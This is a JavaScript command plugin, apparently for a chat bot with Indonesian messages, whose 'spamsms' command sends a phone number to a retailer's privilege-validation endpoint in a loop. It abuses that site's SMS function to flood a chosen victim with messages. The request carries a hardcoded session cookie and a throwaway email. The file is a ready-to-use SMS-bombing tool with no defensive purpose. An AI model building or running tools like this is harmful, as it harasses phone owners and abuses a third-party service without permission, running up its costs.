import axios from 'axios';

let successCount = 0;
let failCount = 0;

async function sendSMS(phone) {
    try {
        const response = await axios.post("https://www.mothercare.co.id/privilege_activation/ajax/validateprivilege", {
            email: 'tootoovex@risu.be',
            phone: '+' + phone
        }, {
            headers: {
                'Content-Type': 'application/json',
                'Cookie': 'PHPSESSID=385a8e552bfdf6bce03fa0d4703dff8f;X-Magento-Vary=6eb1a85fd230ac0734d5c6dbf29c9fab4c14e22e;_hjSession_1407191=eyJpZCI6IjljNjBlMmM3LTQ3ZGUtNDYyMy04NTZiLTllMGE5YjFhMzJlMSIsImMiOjE3MTIzNjE3Mzc1OTMsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=;form_key=92FPuMSvE1sdQJ3B;mage-cache-storage={};mage-cache-storage-section-invalidation={};mage-cache-sessid=true;mage-messages=;_gcl_au=1.1.1698650236.1712361754;form_key=92FPuMSvE1sdQJ3B;recently_viewed_product={};recently_viewed_product_previous={};recently_compared_product={};recently_compared_product_previous={};product_data_storage={};_ga=GA1.1.1453237401.1712361755;_fbp=fb.2.1712361756815.1883026824;_tt_enable_cookie=1;_ttp=fAme1TCbtIJl4aCmyLbtKFnMeLk;private_content_version=ce0927a7576674f1feb4a35f7c11c53c;section_data_ids={%22messages%22:1712361765%2C%22company%22:1712361765%2C%22personal-data%22:1712361765};_hjSessionUser_1407191=eyJpZCI6IjU3MzM3M2U1LWIwNjctNWY2MS1hZjc3LWIyMzA2YTVhMWViZiIsImNyZWF0ZWQiOjE3MTIzNjE3Mzc1ODQsImV4aXN0aW5nIjp0cnVlfQ==;klv_mage={"expire_sections":{"customerData":1712362439}};_ga_WVX2TL3S4L=GS1.1.1712361755.1.1.1712361848.35.0.0'
            }
        });

        return response.data.status === "success"; // Assuming the API returns "success" for successful SMS sending
    } catch (error) {
        console.error("Error sending SMS:", error);
        return false; // Return false in case of an error
    }
}

const handler = async (m, { text, usedPrefix, command }) => {
    if (!text) throw `Format yang kamu masukkan salah. Contoh penggunaan: *${usedPrefix}spamsms 628xxxxx|jumlah spam*`;

    let [phone, count] = text.split('|');
    phone = phone.trim();
    count = parseInt(count.trim());

    if (!phone || !count || isNaN(count) || count <= 0) throw `Format yang kamu masukkan salah. Contoh penggunaan: *${usedPrefix}spamsms 628xxxxx|jumlah spam*`;

    try {
        for (let i = 0; i < count; i++) {
            if (await sendSMS(phone)) {
                successCount++;
            } else {
                failCount++;
            }
        }

        m.reply(`Berhasil mengirim ${successCount} SMS ke nomor ${phone}. Spam Gagal: ${failCount}`);
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat mengirim SMS.`);
    }
};

handler.command = /^spamsms$/i;
handler.help = ['spamsms 628xxxxx|jumlah spam'];
handler.tags = ['xyz'];
handler.premium = true;

export default handler;